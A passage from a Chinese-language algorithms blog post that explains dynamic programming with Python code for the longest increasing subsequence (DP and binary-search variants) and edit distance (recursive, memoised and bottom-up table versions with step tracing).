punctuation">)</span><span class="token punctuation">)</span></code></pre><p>演示图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421220220973.png" alt="" loading="lazy"></p><p>借用大佬的一句话：</p><p>计算机解决问题其实没有任何奇技淫巧，他唯一的解决方法就是穷举，穷举所有的可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明的穷举”</p><h3 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422111536792.png" alt="" loading="lazy"></p><h4 id="动态规划解法"><a href="#动态规划解法" class="headerlink" title="动态规划解法"></a>动态规划解法</h4><p>动态规划的核⼼设计思想是数学归纳法。</p><p>假设当结论在<code>k&lt;n</code>的时候成立，然后想办法证明<code>k=n</code>的时候结论也成立，如果能够证明的出来，那么就说明这个结论对于任何数都成立，再看到这个题目，假如我们能够证明，最后一个<code>nums[i]</code>的值大于前一个<code>nums[j]</code>的值，那么就能够证明出他和<code>nums[j]</code>所构成的最长递增子序列能够结合，随后再将长度加一，且将<code>nums[i]</code>加入到这个最长递增子序列中，即：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/gif2.gif" alt="" loading="lazy"></p><p>代码实现</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token number">0</span>    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 定义每一位数的最长递增子序列</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 令每一位的初始值为1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> max<span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># dp[i]表示nums[i]这个数结尾的最长递增子序列的长度</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>dp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> max<span class="token punctuation">(</span>res<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>可见时间复杂度为O(n^2)</p><h4 id="二分查找解法"><a href="#二分查找解法" class="headerlink" title="二分查找解法"></a>二分查找解法</h4><p>将输入的序列分成若干堆，需要遵循以下规则：</p><p>只能把小的数字压到比它大的数字上，也就是用小的数字覆盖掉原来大的，那么如何去压呢？那么就看该数字该如何选择了，如果当前数字较大没有可以放置的堆，那么就在边上新建一个堆，再把数字放进去，如果有多个堆可以选择，则选择这多个堆中考最左边的位置，保证堆顶的数字是有序的了，就像这样（A是最大的）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120140509.png" alt="" loading="lazy"></p><p>这样堆顶的数字就可以形成一个最长递增子序列，当然序列肯定不止一个，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120330841.png" alt="" loading="lazy"></p><p>能够保证得出最长递增子序列，随后在查找该放在哪个堆的时候使用二分法查找就可以提高效率，代码如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    piles <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment" spellcheck="true">#定义最长递增子序列的长度</span>    top <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 定义每一位数的最长递增子序列</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        top<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 令每一位的初始值为1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        poker <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        left <span class="token operator">=</span> <span class="token number">0</span>        right <span class="token operator">=</span> piles        <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>            mid <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> top<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> poker<span class="token punctuation">:</span>                right <span class="token operator">=</span> mid            <span class="token keyword">elif</span> top<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> poker<span class="token punctuation">:</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right <span class="token operator">=</span> mid        <span class="token keyword">if</span> left <span class="token operator">==</span> piles<span class="token punctuation">:</span>            piles <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment" spellcheck="true"># 最长递增子序列的长度加一</span>        top<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">=</span> poker    <span class="token keyword">return</span> piles<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h3><p>先来看一下题目描述</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422161419634.png" alt="" loading="lazy"></p><h4 id="递归解法"><a href="#递归解法" class="headerlink" title="递归解法"></a>递归解法</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> j <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment" spellcheck="true"># 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment" spellcheck="true"># 同上</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 若相等直接跳过进行下一个字符的判断</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> min<span class="token punctuation">(</span>dp<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 插入</span>                       dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 替换</span>                       dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 删除</span>    <span class="token keyword">return</span> dp<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>以上是将<code>apple</code>和<code>add</code>两个字符串进行转换，得出的结果为4，即所需操作的最小值</p><h4 id="带备忘录的递归解法-2"><a href="#带备忘录的递归解法-2" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    memo <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 备忘录</span>    <span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token keyword">in</span> memo<span class="token punctuation">:</span>            <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> j <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment" spellcheck="true"># 假如当s1字符串循环i次循环完了，j还有剩下的部分就直接全部进行一个操作j+1次即可，因为还剩下j+1个字符</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment" spellcheck="true"># 同上</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 若相等直接跳过进行下一个字符的判断</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> min<span class="token punctuation">(</span>dp<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 插入</span>                               dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 替换</span>                               dp<span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 删除</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> dp<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="DP-table解法-2"><a href="#DP-table解法-2" class="headerlink" title="DP table解法"></a>DP table解法</h4><p>自底向上</p><p>首先确定<code>dp</code>数组的含义，<code>dp</code>数组是一个二维数组，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170423923.png" alt="" loading="lazy"></p><p><code>dp[i][j]</code>存储着<code>s1[i]</code>和<code>s2[j]</code>的最小编辑距离，各相邻的数据之间有如下关系：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422170651675.png" alt="" loading="lazy"></p><p>于是就可以写出以下代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> len<span class="token punctuation">(</span>s1<span class="token punctuation">)</span>    n <span class="token operator">=</span> len<span class="token punctuation">(</span>s2<span class="token punctuation">)</span>    dp <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> min<span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>随后还可以将步骤推出来：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> len<span class="token punctuation">(</span>s1<span class="token punctuation">)</span>    n <span class="token operator">=</span> len<span class="token punctuation">(</span>s2<span class="token punctuation">)</span>    dp <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 记录每一步的操作 0：啥都不做，1：插入，2：替换，3：删除</span>    dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    a<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i        a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i        a<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 不动，也就是相同直接跳过 0</span>                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> min<span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 插入 1</span>                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 替换 2</span>                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 删除 3</span>            <span class="token keyword">if</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">elif</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>            <span class="token keyword">elif</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>以上代码将输出：</p><pre><code>0333331033331122221112224</code></pre><p>从后面往前推就行，0,2代表对角（跳过/替换），1代表向上（插入），3代表向左（删除）</p><p>寻找到0的最佳捷径就OK</p><h3 id="高楼扔鸡蛋"><a href="#高楼扔鸡蛋" class="headerlink" 